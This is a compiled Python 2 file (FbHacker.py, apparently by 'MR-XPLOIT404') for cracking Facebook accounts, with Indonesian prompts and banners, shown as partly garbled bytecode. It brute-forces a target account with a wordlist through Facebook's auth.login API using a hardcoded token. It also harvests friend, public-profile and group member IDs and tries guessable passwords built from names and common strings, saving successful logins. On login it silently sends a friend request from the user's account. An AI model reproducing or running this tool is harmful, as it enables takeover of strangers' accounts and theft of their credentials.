�
� �_c           @   s�  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l
 m Z d  d l m Z d  d l m Z y d  d l Z Wn e k
 r� e  j d � n2 Xy d  d l Z Wn e k
 r-e  j d � n Xd  d l m Z d  d l m Z e e � e j d � e j �  Z e j e � e j e j j �  d d	 �d
 d f g e _ d �  Z d
 �  Z d �  Z d �  Z  d Z! d �  Z" d Z# g  Z$ g  Z% g  a& g  a' g  Z( g  Z) d Z* d Z+ d Z, d �  Z- d �  Z. d �  Z/ d �  Z0 d �  Z1 d �  Z2 d �  Z3 d �  Z4 d �  Z5 d �  Z6 e- �  d S(    i����N(   t
   ThreadPool(   t   ConnectionError(   t   Browsers   pip2 install mechanizes   pip2 install requestst   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C   s   d GHt  j j �  d  S(   Ns   [00m[!] [1;91mExit(   t   ost   syst   exit(    (    (    s   /sdcard/FbHacker.pyt   keluar   s    c         C   sS   d } d } x: |  D]2 } | d | t  j d t | � d � | 7} q Wt | � S(   Nt   mhkbpcPt    t   !i    i   (   t   randomt   randintt   lent   cetak(   t   xt   wt   dt   i(    (    s   /sdcard/FbHacker.pyt   acak   s
    
0c         C   s~   d } xA | D]9 } | j  | � } |  j d | d t d | � � }  q
 W|  d 7}  |  j d d � }  t j j |  d � d  S(   NR	   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   j(    (    s   /sdcard/FbHacker.pyR   (   s    
(
c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g�������?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/FbHacker.pyt   jalan3   s    
s�  [32;1m
         _,.-------.,_
     ,;~'             '~;,
   ,;                     ;,
  ;                         ;
 ,'                         ',
,;                           ;,
; ;      .           .      ; ;
| ;   ______       ______   ; |
|  `/~"     ~" . "~     "~'  |
|  ~  ,-~~~^~, | ,~^~~~-,  ~  |
 |   |        }:{        |   |
 |   l       / | \       !   |
 .~  (__,.--" .^. "--.,__)  ~.
 |     ---;' / | \ `;---     |
  \__.       \/^\/       .__/
   V| \                 / |V
    | |T~\___!___!___/~T| |
    | |`[1;91mIIII_I_I_I_IIII[1;92m'| |
    |  \,[1;91mI[1;91mII I I I III[1;92m,/  |
     \   `~~~~~~~~~~'    /
       \   .       .   /
         \.    ^    ./
          ^~~~^~~~^~^
[1;92m╔════════════════════════════════════════╗
[1;92m║[1;91m* [1;97mAuthor  [1;91m: [1;97mMR-XPLOIT404 
[1;92m║[1;91m* [1;97mGithub  [1;91m: [1;97mhttps://github.com/IBRAHIM137[1;92m║[1;91m* [1;91mYOUTUBE  [1;91m: [1;97mMR-XPLOIT404
[1;92m╚════════════════════════════════════════╝c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j �  t j d � q Wd  S(   Ns   .   s   ..  s   ... s    [1;91m
[●] [92mSedang masuk i   (   R   R   R   R   R   (   t   titikt   o(    (    s   /sdcard/FbHacker.pyt   tik<   s
    

i    s
   [31mNot Vulns	   [32mVulns�  [1;96m      █████████ [1;93m* [1;92mAuthor [1;93m: [1;92mMR-XPLOIT404[1;96m
      █▄█████▄█ [1;93m* [1;93mVersi [1;93m: [1;93mGOLD[1;96m
      █ [1;91m▼▼▼▼▼[1;96m █ [1;93m* [1;92mWhatsApp [1;93m: [1;97m6287819450610[1;96m
     ██▌     ██▌ 
      [1;96m█ [1;91m▲▲▲▲▲[1;96m █ [1;93m* [1;91mYOUTUBE [1;93m: [1;97mBLACK HAT[1;96m
      █████████ 
       ██   ██c           C   s   d GHd GHd GHd GHt  �  d  S(   Ns   [☆]PILIH MENU ANDA[☆]s"   [1]BRUTE FORCE FACEBOOK [NO LOGIN]s   [2]MBF [LOGIN]s   [0]exit(   t   tentu(    (    (    s   /sdcard/FbHacker.pyt   masukR   s
    c          C   sk   t  d � }  |  d k r' d GHt �  n@ |  d k r= t �  n* |  d k rS t �  n |  d k rg d GHn  d  S(   Ns
   ╚═>>> R
   s   [!]Isi yang benart   1t   2t   0t   EXIT(   t	   raw_inputR$   t   startt   login(   t   mantap2(    (    s   /sdcard/FbHacker.pyR$   Y   s    


c    	      C   sb  y6t  j d � t GHt d � }  t d � } t | d � } | j �  } d |  GHt j d � d t t	 | � � GHHt | d � } x�| D]�} yx| j
 d d	 � } t j j
 d
 |  d | � t j j �  t j d |  d
 | d � } t j | j � } d | k r�t d d � } | j
 d |  d � | j
 d | � | j �  Hd d GHd |  GHd | GHd GHd d GHt j �  n� d | d k rt d d � } | j
 d |  d � | j
 d | � | j �  Hd d GHd |  GHd | GHd GHd d GHt j �  n  Wq� t j j k
 r0d GHt j �  q� Xq� WWn% t k
 r]d GHd  GHt j �  n Xd  S(!   Nt   clears   [1;96mID/Email : [1;93ms   [1;96mFile Wordlist : [1;93mt   rs   [1;96mTarget :[1;93m g      @s   [1;96mTotal List :[;93m s   
R
   s   
[1;96ms
   [1;93m : s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens
   succes.txtR   s   [ID]=> s
   [password]=> i*   s   [1;93m=s   [1;96mID : [1;93ms   [1;96mpassword : [1;93ms   [1;96mStatus : [1;93mOKs   www.facebook.comt	   error_msgs   succesCP.txts   [PW]=> s   [1;96mStatus : [1;93mCPs-   [37;1m[[32;1mx[37;1m] [31;1mkoneksi errors9   [37;1m[[32;1mx[37;1m] [37;1mAlamat wordlist tidak adasF   [37;1m[[32;1mx[37;1m] [37;1mSaya sarankan Untuk Membuatnya sendiri(   R   t   systemt   logobfR*   t   opent	   readlinesR   R   R   R   R   R   R   R   R   t   requestst   gett   jsont   loadst   textt   closeR   t
   exceptionsR   t   IOError(	   t   emailt   pwdt   totalt   sandit   pwt   datat   mpsht   dapatt   ceks(    (    s   /sdcard/FbHacker.pyR+   e   sd    
	



				

				
c          C   s�  t  j d � t  j d � y t d d � }  t �  Wn�t t f k
 r�t  j d � t GHd GHt d � } t d � } t �  y t	 j d � Wn  t
 j k
 r� d	 GHt �  n Xt
 t	 j _ t	 j d
 d � | t	 j d <| t	 j d
 <t	 j �  t	 j �  } d | k rcy.d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d d  6d! d" 6} t j d# � } | j | � | j �  } | j i | d$ 6� d% } t j | d& | �} t j | j � }	 t d d' � }
 |
 j |	 d( � |
 j �  d) GHt j d* |	 d( � t  j d+ � t �  Wqct j  j! k
 r_d, GHt �  qcXn  d- | k r�d. GHt  j d/ � t" j# d0 � t �  q�d1 GHt  j d/ � t" j# d0 � t$ �  n Xd  S(2   NsA   xdg-open https://www.youtube.com/channel/UCpkpo77N8zfXBr9JUzp8gGgR.   s	   login.txtR/   s3   [91m[☆] [92mLOGIN AKUN FACEBOOK ANDA [91m[☆]s%   [00m[+] [92mID/Email [00m: [1;00ms#   [00m[+] [92mPassword [00m: [00ms   https://m.facebook.coms"   
[00m[!] [1;91mTidak ada koneksit   nri    R>   t   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatR&   t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodR(   t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramsR   R0   s#   
[1;96m[✓] [1;92mLogin BerhasilsM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=s8   https://www.youtube.com/channel/UCpkpo77N8zfXBr9JUzp8gGgs$   
[1;96m[!] [1;91mTidak ada koneksit
   checkpoints7   
[1;96m[!] [1;91mSepertinya akun anda kena checkpoints   rm -rf login.txti   s'   
[1;96m[!] [1;91mPassword/Email salah(%   R   R2   R4   t   menut   KeyErrorR=   t   logoR*   R#   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestR6   R7   R8   R9   R:   R   R;   t   postR<   R   R   R   R,   (   t   tokett   idR?   t   urlRW   RC   R   t   aR/   R   t   unikers(    (    s   /sdcard/FbHacker.pyR,   �   sj    





S







c          C   s_  t  j d � y t d d � j �  }  WnD t k
 rl t  j d � d GHt  j d � t j d � t �  n Xy= t j	 d |  � } t
 j | j � } | d } | d	 } Wnf t
 k
 r� t  j d � d GHt  j d � t j d � t �  n# t j j k
 rd
 GHt �  n Xt  j d � t GHd | d GHd
 d GHd GHd GHd GHd GHd GHt �  d  S(   NR.   s	   login.txtR/   s   [1;96m[!] [1;91mToken invalids   rm -rf login.txti   s+   https://graph.facebook.com/me?access_token=t   nameRm   s#   [1;96m[!] [1;91mTidak ada koneksis   [92mSelamat datang[00m s   [00mi*   s   [00m-s8   [1;97m1.[1;93m Crack account Indo/Pakistan/Bangladesh s+   [1;97m2.[1;93m Crack account Random      s   [1;97m3.[1;93m Update      s5   [1;97m4.[1;93m Subscribe Channel MR-XPLOIT404      s$   
[1;91m0.[1;91m Logout            (   R   R2   R4   t   readR=   R   R   R   R6   R7   R8   R9   R:   R[   R,   R<   R   R\   t   pilih(   Rl   t   otwRo   t   namaRm   (    (    s   /sdcard/FbHacker.pyRZ   �   sB    












	c          C   s�   t  d � }  |  d k r' d GHt �  n� |  d k r= t �  n� |  d k rS t �  nr |  d k ri t �  n\ |  d k r t �  nF |  d k r� t j d � t d	 � t j d
 � t �  n d GHt �  d  S(   Ns   
[00m >>[92mR
   s   [00m[!] [1;91mIsi yang benarR&   R'   t   3R(   R.   s   Menghapus tokens   rm -rf login.txt(	   R*   Rs   t   superRi   t   subsR   R2   R    R   (   Rp   (    (    s   /sdcard/FbHacker.pyRs   �   s&    








c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHd GHd	 GHt
 �  d  S(
   NR.   s	   login.txtR/   s   [00m[!] [1;91mToken invalids   rm -rf login.txti   s$   [92m1.[00m Crack dari daftar temans   [92m2.[00m Crack dari publics   
[1;91m0.[1;91m Kembali(   R   R2   R4   Rr   Rl   R=   R   R   R   R\   t   pilih_super(    (    (    s   /sdcard/FbHacker.pyRw     s    




c          C   s�  t  d � }  |  d k r' d GHt �  na|  d k r� t j d � t GHt d � t j d t � } t	 j
 | j � } x| d D] } t j
 | d	 � q Wn�|  d
 k r�t j d � t GHt  d � } y> t j d | d
 t � } t	 j
 | j � } d | d GHWn' t k
 r.d GHt  d � t �  n Xt d � t j d | d t � } t	 j
 | j � } x�| d D] } t j
 | d	 � qqWn�|  d k r�t j d � t GHt  d � } y> t j d | d t � } t	 j
 | j � }	 d |	 d GHWn' t k
 r d GHt  d � t �  n Xt d � t j d | d t � }
 t	 j
 |
 j � } x� | d D] } t j
 | d	 � qcWn� |  d k rt j d � t GHyC t  d � } x0 t | d � j �  D] }
 t j
 |
 j �  � q�WWq1t k
 rd GHt  d � t �  q1Xn" |  d  k r%t �  n d GHt �  d! t t t � � GHd" d# d$ g } x0 | D]( } d% | Gt j j �  t j d& � q\WHd' GHd( d) GHd* �  } t d+ � } | j | t � d, GHd- t t t � � d. t t t � � GHt  d � t �  d  S(/   Ns   
[1;97m >>> [1;97mR
   s   [00m[!] [1;91mIsi yang benarR&   R.   s'   [00m[✺] [92mMengambil ID [1;97m...s3   https://graph.facebook.com/me/friends?access_token=RC   Rm   R'   s0   [00m[+] [92mMasukan ID public [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s6   [00m[[92m✓[00m] [92mNama public[1;91m :[1;97m Rq   s$   [00m[!] [91mTeman tidak ditemukan!s   
[00m[[92mKembali[00m]s   /friends?access_token=Rv   s/   [00m[+] [92mMasukan ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s5   [00m[[92m✓[00m] [92mNama group [1;91m:[1;97m s%   [00m[!] [1;91mGroup tidak ditemukans   
[1;96m[[1;97mKembali[1;96m]s5   /members?fields=name,id&limit=999999999&access_token=t   4s-   [00m[+] [92mMasukan nama file  [00m: [00mR/   s$   [00m[!] [1;91mFile tidak ditemukans   
[00m[ [91mKembali [00m]R(   s#   [92m[+] [00mTotal ID [00m: [92ms   .   s   ..  s   ... s*   
[92m[[1;97m✸[92m] [00mCrack [1;97mi   s1   [1;92m[!] [00mLebih cepat gunakan VPN Brazil/USi*   s   [00m-c         S   s-  |  } y t  j d � Wn t k
 r* n Xy�t j d | d t � } t j | j � } | d d } t	 j
 d | d | d � } t j | � } d	 | k r� d
 | d | GHt j
 | | � nVd | d
 k r� d | d | GHt j
 | | � n!| d d } t	 j
 d | d | d � } t j | � } d	 | k rjd | d | GHt j
 | | � n�
d | d
 k r�d | d | GHt j
 | | � n
| d d } t	 j
 d | d | d � } t j | � } d	 | k rd | d | GHt j
 | | � n
d | d
 k rAd | d | GHt j
 | | � n�| d d }	 t	 j
 d | d |	 d � } d	 | k r�d | d |	 GHt j
 | |	 � nd | d
 k r�d | d |	 GHt j
 | |	 � nJ| d d }
 t	 j
 d | d |
 d � } t j | � } d	 | k rAd | d |
 GHt j
 | |
 � n�d | d
 k rvd | d |
 GHt j
 | |
 � n�| d d } t	 j
 d | d | d � } t j | � } d	 | k r�d | d | GHt j
 | | � n;d | d
 k rd | d | GHt j
 | | � n| d d } t	 j
 d | d | d � } t j | � } d	 | k r�d | d | GHt j
 | | � n�
d | d
 k r�d | d | GHt j
 | | � nd
| d d }
 t	 j
 d | d |
 d � } t j | � } d	 | k r'd | d |
 GHt j
 | |
 � n�	d | d
 k r\d | d |
 GHt j
 | |
 � n�	d } t	 j
 d | d | d � } t j | � } d	 | k r�d | d | GHt j
 | | � n]	d | d
 k r�d | d | GHt j
 | | � n(	d } t	 j
 d | d | d � } t j | � } d	 | k r[d | d | GHt j
 | | � n�d | d
 k r�d | d | GHt j
 | | � n�d } t	 j
 d | d | d � } t j | � } d	 | k r�d | d | GHt j
 | | � n)d | d
 k r*d | d | GHt j
 | | � n�| d d } t	 j
 d | d | d � } t j | � } d	 | k r�d | d | GHt j
 | | � n�d | d
 k r�d | d | GHt j
 | | � nR| d d } t	 j
 d | d | d � } t j | � } d	 | k r9d | d | GHt j
 | | � n�d | d
 k rnd | d | GHt j
 | | � n�d } t	 j
 d | d | d � } t j | � } d	 | k r�d | d | GHt j
 | | � nKd | d
 k r	d | d | GHt j
 | | � nd } t	 j
 d | d | d � } t j | � } d	 | k rm	d | d | GHt j
 | | � n�d | d
 k r�	d | d | GHt j
 | | � n|d } t	 j
 d | d | d � } t j | � } d	 | k r
d | d | GHt j
 | | � nd | d
 k r<
d | d | GHt j
 | | � n�d } t	 j
 d | d | d � } t j | � } d	 | k r�
d | d | GHt j
 | | � n}d | d
 k r�
d | d | GHt j
 | | � nHd } t	 j
 d | d | d � } t j | � } d	 | k r;d | d | GHt j
 | | � n�d | d
 k rpd | d | GHt j
 | | � n�d } t	 j
 d | d | d � } t j | � } d	 | k r�d | d | GHt j
 | | � nId | d
 k r
d | d | GHt j
 | | � nd } t	 j
 d | d | d � } t j | � } d	 | k rod | d | GHt j
 | | � n�d | d
 k r�d | d | GHt j
 | | � nzd } t	 j
 d | d | d � } t j | � } d	 | k r	
d | d | GHt j
 | | � nd | d
 k r>
d | d | GHt j
 | | � n�d  } t	 j
 d | d | d � } t j | � } d	 | k r�
d | d | GHt j
 | | � n{d | d
 k r�
d | d | GHt j
 | | � nFd! } t	 j
 d | d | d � } t j | � } d	 | k r=d | d | GHt j
 | | � n� d | d
 k rrd | d | GHt j
 | | � n� t j | j � } d" } t	 j
 d | d | d � } t j | � } d	 | k r�d | d | GHt j
 | | � n5 d | d
 k rd | d | GHt j
 | | � n  Wn n Xd  S(#   Nt   outs   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R0   s   [92mHACKED]s   <=>s   www.facebook.comR1   s   [91m[CHECKPOINT]t   1234s
   [92m[HACKED]t   12345t   123456t	   last_namet   Kontolt	   Kontol123t   786786t   786t
   Bangladesht
   Bangladesh123t   Pakistant   Pakistan123t   Bangsatt
   Bangsat123t   Anjingt	   Anjing123t   Sayangt	   Sayang123t	   Indonesia(   R   t   mkdirt   OSErrorR6   R7   Rl   R8   R9   R:   t   urllibt   urlopent   loadt   okst   appendt   cekpointt   txt(   t   argt   userRo   t   bt   pass1RC   t   qt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7t   pass8t   pass9t   pass10t   pass12t   pass13t   pass14t   pass15t   pass16t   pass17t   pass18t   pass19t   pass20t   pass21t   pass22t   pass23t   pass24t   pass25(    (    s   /sdcard/FbHacker.pyt   mainz  s�   
i   s/   [00m[[00m✓[00m] [1;92mSelesai [1;97m....s/   [00m[+] [1;92mTotal OK/[91mCP [93m: [1;92ms
   [1;97m/[91m(    R*   Ry   R   R2   R\   R    R6   R7   Rl   R8   R9   R:   Rm   R�   R[   Rw   R4   R5   t   stripR=   RZ   R   R   R   R   R   R   R   R    t   mapR�   R�   (   t   peakR/   R   t   st   idtt   jokt   opR   t   idgt   aswt   ret   pt   idlistt   lineR!   R"   R�   (    (    s   /sdcard/FbHacker.pyRy   &  s�    
















		�)
c           C   s"   t  j d � t d � t �  d  S(   Ns   git pulls   
[00m[[92mKembali[00m](   R   R2   R*   RZ   (    (    (    s   /sdcard/FbHacker.pyRi   ~  s    

c           C   s   t  j d � t �  d  S(   NsA   xdg-open https://www.youtube.com/channel/UCpkpo77N8zfXBr9JUzp8gGg(   R   R2   RZ   (    (    (    s   /sdcard/FbHacker.pyRx   �  s    
(7   R   R   R   t   datetimeR   Rg   R�   t	   threadingR8   R�   t	   cookielibR6   R^   t   multiprocessing.poolR    t   requests.exceptionsR   R   t   ImportErrorR2   t   reloadt   setdefaultencodingR]   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R    R\   R#   t   backt   threadst   berhasilR�   R�   Rm   t   listgrupt   vulnott   vulnR3   R%   R$   R+   R,   RZ   Rs   Rw   Ry   Ri   Rx   (    (    (    s   /sdcard/FbHacker.pyt   <module>   s^   �




										6	;	&			� Y		
